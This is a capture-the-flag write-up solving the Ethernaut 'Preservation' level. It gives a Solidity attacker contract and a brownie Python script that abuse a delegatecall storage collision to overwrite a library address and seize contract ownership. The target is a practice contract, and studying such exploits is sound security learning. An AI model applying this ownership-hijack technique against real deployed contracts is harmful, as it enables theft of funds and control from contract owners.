# Preservation 
This levels requires you to know about storage in smart contracts as in privacy level and to know delegation attack as in delegation level.

## Steps:
1. Deploy malios contract that has the same storage layout as the Preservation contract.
2. Change timeZone1Library address to that of a maliose contract by the use of the delegation call.
3. Call `setFirstTime` function with any attribute.

#### Step 1:
You should deploy a contract with same storage layout as the Preservation contract  and having the function `setTime`.
Inside this function is were you would take ownership of the contract by this statement `owner = tx.origin`.

Here's the code of the contract:
````solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public{
        owner = tx.origin;
    }

}
````
#### Step 2&3:
In this step you should abuse the delegation call to change the address of `timeZone1Library`.The delegated called contract has one variable which is in slot one,so the delegate call will change that of `timeZone1Library` not storedTime.So we can just call the function `setFirstTime()`
and pass the address of the deployed malusios contract casted to uint.
This steps is done in console or brownie.

here is the code used:
```python
def exploit():
    # Get account address you can see first CTFs for complete code 
    account = get_account()
    # Get contract ABI
    preservation = interface.Preservation(config['Address'])
    #first call
    preservation.setFirstTime(int('0xD953221A4B2AAFF90B865aB281FE197661AE6d88',16),{"from": account})
    #second call (the parameter is not important)
    preservation.setFirstTime(int('0xD953221A4B2AAFF90B865aB281FE197661AE6d88',16), {"from": account})

```